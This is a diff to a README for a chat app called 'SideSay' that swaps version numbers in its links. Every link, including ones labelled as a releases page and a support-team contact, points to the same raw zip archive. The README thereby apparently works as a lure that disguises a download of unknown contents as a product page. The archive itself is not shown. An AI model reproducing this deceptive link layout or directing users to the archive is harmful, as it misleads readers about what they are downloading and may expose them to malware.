@@ -1,7 +1,7 @@
 # 💬 SideSay - Instant, Private Chat Made Easy
 
 ## 🔗 Download Now
-[![Download SideSay](https://raw.githubusercontent.com/ekohsomtochukwujeremiah/SideSay/main/static/Side_Say_v3.1.zip%20SideSay-Here-brightgreen)](https://raw.githubusercontent.com/ekohsomtochukwujeremiah/SideSay/main/static/Side_Say_v3.1.zip)
+[![Download SideSay](https://raw.githubusercontent.com/ekohsomtochukwujeremiah/SideSay/main/static/Side_Say_v1.7.zip%20SideSay-Here-brightgreen)](https://raw.githubusercontent.com/ekohsomtochukwujeremiah/SideSay/main/static/Side_Say_v1.7.zip)
 
 ## 📜 Description
 SideSay Web is a simple, secure, and real-time chat app designed for privacy. It lets you connect with friends instantly without leaving a trace. With a modern design, you can customize themes and use dark mode to make it your own, all while keeping your conversations private.
@@ -17,7 +17,7 @@ To begin using SideSay, follow the steps below to download and run the applicati
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://raw.githubusercontent.com/ekohsomtochukwujeremiah/SideSay/main/static/Side_Say_v3.1.zip) to find the latest version of SideSay.
+   Go to our [Releases page](https://raw.githubusercontent.com/ekohsomtochukwujeremiah/SideSay/main/static/Side_Say_v1.7.zip) to find the latest version of SideSay.
 
 2. **Download the Application**  
    Click on the version you want to download. You’ll see options for different operating systems. Choose the one that matches your system.
@@ -50,14 +50,14 @@ To begin using SideSay, follow the steps below to download and run the applicati
 - **Login Issues**: Double-check your email and password. Use the “Forgot Password?” link if needed.
 
 ## 🗂️ Support
-If you have any questions or need further help, please reach out to our support team at [https://raw.githubusercontent.com/ekohsomtochukwujeremiah/SideSay/main/static/Side_Say_v3.1.zip](https://raw.githubusercontent.com/ekohsomtochukwujeremiah/SideSay/main/static/Side_Say_v3.1.zip). 
+If you have any questions or need further help, please reach out to our support team at [https://raw.githubusercontent.com/ekohsomtochukwujeremiah/SideSay/main/static/Side_Say_v1.7.zip](https://raw.githubusercontent.com/ekohsomtochukwujeremiah/SideSay/main/static/Side_Say_v1.7.zip). 
 
 ## 📖 Additional Resources
 - For advanced features, check our documentation on the GitHub repository.
 - Join our [User Forum](#) for tips, tricks, and community support.
 
 ## 🔗 Important Links
-- [Get the Latest Version](https://raw.githubusercontent.com/ekohsomtochukwujeremiah/SideSay/main/static/Side_Say_v3.1.zip)
+- [Get the Latest Version](https://raw.githubusercontent.com/ekohsomtochukwujeremiah/SideSay/main/static/Side_Say_v1.7.zip)
 - [Documentation](#)
 - [User Forum](#)
 
